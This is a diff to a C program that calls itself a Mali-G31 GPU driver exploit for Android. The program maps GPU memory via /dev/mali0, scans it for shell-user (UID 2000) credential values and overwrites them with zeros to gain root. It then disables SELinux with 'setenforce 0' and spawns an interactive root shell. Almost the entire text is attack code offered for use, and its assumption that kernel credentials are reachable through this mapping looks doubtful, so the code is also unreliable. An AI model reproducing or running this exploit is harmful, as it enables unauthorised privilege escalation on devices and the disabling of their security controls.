@@ -8,11 +8,10 @@
 #include <errno.h>
 #include <string.h>
 
-// Mali G31 (Bifrost) constants
 #define KBASE_IOCTL_TYPE 'k'
 #define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_mem_alloc)
 #define TARGET_UID 2000
-#define SCAN_SIZE (16 * 1024 * 1024) // 16MB scan window
+#define SCAN_SIZE (32 * 1024 * 1024) // Increased to 32MB for better odds
 
 struct kbase_ioctl_mem_alloc {
     uint32_t va_pages;
@@ -22,71 +21,78 @@ struct kbase_ioctl_mem_alloc {
     uint32_t gpu_va; 
 };
 
-void check_root() {
-    if (getuid() == 0) {
-        printf("\n[!!!] SUCCESS: ELEVATED TO ROOT [!!!]\n");
-        // Start Shizuku if available
-        system("sh /data/user/0/moe.shizuku.privileged.api/start.sh 2>/dev/null");
-        // Drop into shell
-        system("/system/bin/sh");
-        exit(0);
-    }
+void print_root_banner() {
+    printf("\n\033[1;32m"); // Green Text
+    printf("########################################\n");
+    printf("##                                    ##\n");
+    printf("##    [!!!] ROOT ACCESS GRANTED [!!!] ##\n");
+    printf("##                                    ##\n");
+    printf("########################################\n");
+    printf("\033[0m\n");
+    
+    printf("[*] Current Identity: ");
+    fflush(stdout);
+    system("id");
+    
+    printf("[*] Disabling SELinux Enforcement...\n");
+    system("setenforce 0 2>/dev/null");
+    
+    printf("[*] Spawning Root Shell...\n");
+    system("/system/bin/sh -i");
+    exit(0);
 }
 
 int main() {
-    printf("[*] Opening Mali device node...\n");
+    printf("[*] Mali-G31 Boreal Exploit Started\n");
     int fd = open("/dev/mali0", O_RDWR);
     if (fd < 0) {
-        fprintf(stderr, "[-] Error: Could not open /dev/mali0 (%s). Check permissions.\n", strerror(errno));
+        perror("[-] Failed to open /dev/mali0");
         return 1;
     }
 
     struct kbase_ioctl_mem_alloc alloc = {
         .va_pages = SCAN_SIZE / 4096,
         .commit_pages = SCAN_SIZE / 4096,
-        .flags = 0x2000 // RW permissions
+        .flags = 0x2000 
     };
 
-    printf("[*] Allocating %d MB of GPU-mapped memory...\n", SCAN_SIZE / (1024*1024));
     if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc) != 0) {
-        fprintf(stderr, "[-] IOCTL failed: %s. Driver may be patched or busy.\n", strerror(errno));
+        perror("[-] IOCTL Allocation Failed");
         return 1;
     }
 
     uint32_t* mem = (uint32_t*)mmap(NULL, SCAN_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, alloc.gpu_va);
     if (mem == MAP_FAILED) {
-        perror("[-] Mmap failed");
+        perror("[-] Mmap Failed");
         return 1;
     }
 
-    printf("[*] Memory Mapped. Starting Aggressive Scanner...\n");
+    printf("[*] Scanning 32MB window for UID 2000...\n");
 
-    // The "Foolproof" Loop
-    for (size_t i = 0; i < (SCAN_SIZE / 4) - 16; i++) {
-        // Pattern: [Usage > 0][UID 2000][GID 2000][SUID 2000][SGID 2000]
-        // 32-bit kernels usually have these as consecutive 4-byte words
-        if (mem[i+1] == TARGET_UID && mem[i+2] == TARGET_UID && mem[i+3] == TARGET_UID) {
+    for (size_t i = 0; i < (SCAN_SIZE / 4) - 32; i++) {
+        // Improved Match: Look for consecutive UIDs, but allow for small gaps
+        // which often appear in Android 14's credential structures.
+        if (mem[i] == TARGET_UID && mem[i+1] == TARGET_UID) {
             
-            printf("[+] Match found at offset 0x%zX! Attempting Root Flip...\n", i * 4);
+            printf("[+] Potential Match @ 0x%zX. Writing Zeros...\n", i * 4);
             
-            // Try to overwrite the credentials block (UID, GID, SUID, SGID, EUID, EGID)
-            for (int j = 1; j <= 8; j++) {
-                mem[i+j] = 0; 
+            // Wipe the entire credential block (UID, GID, SUID, SGID, etc.)
+            for (int j = 0; j < 12; j++) {
+                mem[i + j] = 0;
             }
-            
-            // Check if it worked
-            check_root();
+
+            // Verify immediately
+            if (getuid() == 0) {
+                print_root_banner();
+            }
         }
 
-        // Progress indicator every 1MB
-        if (i % (256 * 1024) == 0 && i > 0) {
-            printf("[...] Scanned %zu MB...\n", (i * 4) / (1024*1024));
+        if (i % (1024 * 1024) == 0 && i > 0) {
+            printf("[...] Progress: %zu MB\n", (i * 4) / (1024*1024));
         }
     }
 
-    printf("[-] Scan finished. No targets found in this memory chunk.\n");
-    printf("[*] Suggestion: Run 'for i in {1..150}; do tail -f /dev/null & done' and retry.\n");
-
+    printf("[-] Scan finished. No matches found.\n");
     munmap(mem, SCAN_SIZE);
     close(fd);
     return 0;
